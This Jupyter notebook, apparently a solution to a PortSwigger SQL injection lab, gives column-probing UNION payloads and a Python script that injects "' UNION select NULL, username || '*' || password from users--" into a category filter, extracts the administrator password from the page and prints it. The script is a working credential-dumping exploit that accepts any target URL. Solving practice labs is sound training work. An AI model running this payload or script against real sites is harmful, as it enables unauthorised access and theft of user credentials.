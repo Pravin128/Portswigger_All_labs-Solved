{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "SQL injection UNION attack, retrieving data from other tables\n",
    "1)'order by 2 -> 2 columns in table\n",
    "2)(2) Find which columns contain text\n",
    "' UNION SELECT 'a', NULL--\n",
    "' UNION SELECT NULL, 'a'-- ->**\n",
    "->both colums are text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys\n",
    "import urllib3\n",
    "from bs4 import BeautifulSoup\n",
    "import re\n",
    "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
    "\n",
    "proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}\n",
    "\n",
    "def exploit_sqli_users_table(url):\n",
    "    username = 'administrator'\n",
    "    path = '/filter?category=Gifts'\n",
    "    sql_payload = \"' UNION select NULL, username || '*' || password from users--\"\n",
    "    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)\n",
    "    res = r.text\n",
    "    if \"administrator\" in res:\n",
    "        print(\"[+] Found the administrator password...\")\n",
    "        soup = BeautifulSoup(r.text, 'html.parser')\n",
    "        admin_password = soup.find(text=re.compile('.*administrator.*')).split(\"*\")[1]\n",
    "        print(\"[+] The administrator password is '%s'.\" % admin_password)\n",
    "        return True\n",
    "    return False\n",
    "\n",
    "\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    try:\n",
    "        url = sys.argv[1].strip()\n",
    "    except IndexError:\n",
    "        print(\"[-] Usage: %s <url>\" % sys.argv[0])\n",
    "        print(\"[-] Example: %s www.example.com\" % sys.argv[0])\n",
    "        sys.exit(-1)\n",
    "\n",
    "    print(\"[+] Dumping the list of usernames and passwords...\")\n",
    "    if not exploit_sqli_users_table(url):\n",
    "        print(\"[-] Did not find an administrator password.\")\n",
    "    "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
